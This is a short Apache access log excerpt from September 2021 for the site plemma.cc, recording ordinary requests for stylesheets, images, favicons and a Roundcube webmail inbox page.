40.94.20.85 - - [08/Sep/2021:18:47:31 +0000] "GET /highlight.css HTTP/1.1" 404 488 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.18 - - [08/Sep/2021:18:47:31 +0000] "GET /ayu-highlight.css HTTP/1.1" 404 487 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.52 - - [08/Sep/2021:18:47:31 +0000] "GET /xcaliber.dao.jpg HTTP/1.1" 200 14201 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.85 - - [08/Sep/2021:18:47:31 +0000] "GET /css/print.css HTTP/1.1" 200 734 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.32 - - [08/Sep/2021:18:47:31 +0000] "GET /usedjolie.png HTTP/1.1" 200 373194 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
::1 - - [08/Sep/2021:18:47:37 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
40.94.20.42 - - [08/Sep/2021:18:47:43 +0000] "GET /favicon.ico HTTP/1.1" 404 488 "http://plemma.co/rsync" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.27 - - [08/Sep/2021:18:47:59 +0000] "GET /favicon.png HTTP/1.1" 404 488 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.27 - - [08/Sep/2021:18:47:59 +0000] "GET /favicon.svg HTTP/1.1" 404 487 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
178.191.229.57 - - [08/Sep/2021:18:54:23 +0000] "GET /xcaliber.dao.jpg HTTP/1.1" 200 14202 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
178.191.229.57 - - [08/Sep/2021:18:54:23 +0000] "GET /usedjolie.png HTTP/1.1" 200 275120 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
73.107.144.246 - - [08/Sep/2021:18:56:40 +0000] "GET /roundcube/?_task=mail&_mbox=INBOX HTTP/1.1" 200 2709 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
